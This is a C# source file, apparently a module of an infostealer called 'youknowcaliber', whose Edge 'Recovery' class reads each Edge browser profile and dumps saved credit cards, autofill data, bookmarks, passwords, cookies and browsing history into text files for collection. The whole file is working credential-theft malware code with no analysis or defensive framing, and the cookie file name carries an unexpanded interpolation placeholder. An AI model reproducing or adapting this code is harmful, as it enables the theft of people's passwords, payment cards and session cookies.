﻿using System;
using System.Collections.Generic;
using System.IO;
using youknowcaliber.Chromium;

namespace youknowcaliber.Edge
{
	internal sealed class Recovery
	{
		public static void Run(string sSavePath)
		{
			string path = Paths.lappdata + Paths.EdgePath;
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				string text = sSavePath + "\\Edge";
				Directory.CreateDirectory(text);
				foreach (string str in Directory.GetDirectories(path))
				{
					bool flag2 = File.Exists(str + "\\Login Data");
					if (flag2)
					{
						List<CreditCard> cCC = CreditCards.Get(str + "\\Web Data");
						List<AutoFill> aFills = Autofill.Get(str + "\\Web Data");
						List<Bookmark> bBookmarks = Bookmarks.Get(str + "\\Bookmarks");
						List<Password> pPasswords = Passwords.Get(str + "\\Login Data");
						List<Cookie> cCookies = Cookies.Get(str + "\\Cookies");
						List<Site> sHistory = History.Get(str + "\\History");
						cBrowserUtils.WriteCreditCards(cCC, text + "\\CreditCards.txt");
						cBrowserUtils.WriteAutoFill(aFills, text + "\\AutoFill.txt");
						cBrowserUtils.WriteBookmarks(bBookmarks, text + "\\Bookmarks.txt");
						cBrowserUtils.WritePasswords(pPasswords, Help.ExploitDir + "\\Passwords.txt");
						cBrowserUtils.WriteCookies(cCookies, sSavePath + "\\Cookies_Edge({GenStrings.GenNumbersTo()}).txt");
						cBrowserUtils.WriteHistory(sHistory, text + "\\");
					}
				}
			}
		}
	}
}
